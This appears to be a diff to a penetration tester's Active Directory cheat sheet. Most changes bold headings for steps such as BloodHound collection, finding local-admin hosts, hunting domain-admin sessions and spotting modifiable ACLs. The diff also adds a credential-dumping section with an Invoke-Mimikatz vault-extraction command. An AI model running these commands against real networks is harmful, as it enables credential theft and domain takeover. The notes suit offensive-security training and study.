@@ -2,9 +2,9 @@
 
 ## New User
 
-\=> New Bloodhound
+**=> New Bloodhound/Sharphound collection**
 
-Enumerate where you have local admin with the new user
+**Enumerate where you have local admin with the new user**
 
 <pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Find-LocalAdminAccess -Verbose  ==> Results weird?!?!
 <strong>
@@ -21,13 +21,13 @@ Enter-PSSession -ComputerName hostname.fqdn.local
 
 </code></pre>
 
-Enumerate Sessions with the new privs, because you need to be local admin&#x20;
+**Enumerate Sessions with the new privs, because you need to be local admin**&#x20;
 
 ```powershell
 Invoke-Userhunter -groupname "domain admins"
 ```
 
-Find modifieable ACLs with user / Member Groups
+**Find modifieable ACLs with user / Member Groups**
 
 {% code overflow="wrap" %}
 ```powershell
@@ -39,6 +39,14 @@ Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "Gro
 
 
 ### New Computer
+
+**Dump Creds from Lsass**
+
+**Dump creds from credential vault (Scheduled Tasks)**
+
+```powershell
+Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
+```
 
 
 
